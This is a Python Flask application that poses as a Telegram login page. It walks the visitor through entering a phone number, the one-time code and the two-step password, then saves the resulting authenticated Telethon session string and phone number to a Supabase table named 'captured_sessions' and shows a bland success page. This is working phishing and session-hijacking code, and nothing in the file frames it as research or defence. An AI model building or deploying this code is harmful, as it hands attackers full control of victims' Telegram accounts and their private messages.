import os
import asyncio
from flask import Flask, render_template, request, redirect, url_for, session
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from supabase import create_client, Client

# --- SETUP ---
SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
API_ID = os.environ.get('API_ID')
API_HASH = os.environ.get('API_HASH')
FLASK_SECRET_KEY = os.environ.get('FLASK_SECRET_KEY')

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
api_id = int(API_ID)
api_hash = API_HASH

app = Flask(__name__)
app.secret_key = FLASK_SECRET_KEY

def run_async(coro):
    return asyncio.run(coro)

@app.route('/')
def index():
    session.clear()
    return render_template('login.html', step='enter_phone')

@app.route('/send_otp', methods=['POST'])
def send_otp():
    phone = request.form.get('phone')
    session['phone'] = phone

    async def send_code_async():
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session['phone_code_hash'] = result.phone_code_hash
            session['telethon_session'] = client.session.save()
        finally:
            await client.disconnect()
    
    run_async(send_code_async())
    return render_template('login.html', step='enter_code', phone=phone)

@app.route('/login', methods=['POST'])
def login():
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')
    telethon_session = session.get('telethon_session')
    
    code = request.form.get('code')
    password = request.form.get('password')

    if not telethon_session or not phone:
        return redirect(url_for('index'))

    async def try_login_async():
        client = TelegramClient(StringSession(telethon_session), api_id, api_hash)
        await client.connect()
        try:
            if code:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            elif password:
                await client.sign_in(password=password)
        
        except PhoneCodeInvalidError:
            await client.disconnect()
            # Pass the raw phone number back, the front-end will format it.
            return render_template('login.html', 
                                   step='enter_code', 
                                   phone=phone, 
                                   error="Invalid code. Please try again.")
        
        except SessionPasswordNeededError:
            session['telethon_session'] = client.session.save()
            await client.disconnect()
            # Pass the raw phone number back for consistency.
            return render_template('login.html', step='enter_password', phone=phone)
        except Exception as e:
            await client.disconnect()
            return f"<h1>An Error Occurred</h1><p>{e}</p>"
        
        final_session_string = client.session.save()
        await client.disconnect()
        session.clear()
        
        try:
            data_to_insert = { "session_string": final_session_string, "phone_number": phone }
            supabase.table('captured_sessions').insert(data_to_insert).execute()
            print("✅ Successfully saved session AND phone number to Supabase!")
        except Exception as e:
            print(f"❌ Error saving to Supabase: {e}")
            
        return render_template('business_success.html')

    return run_async(try_login_async())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
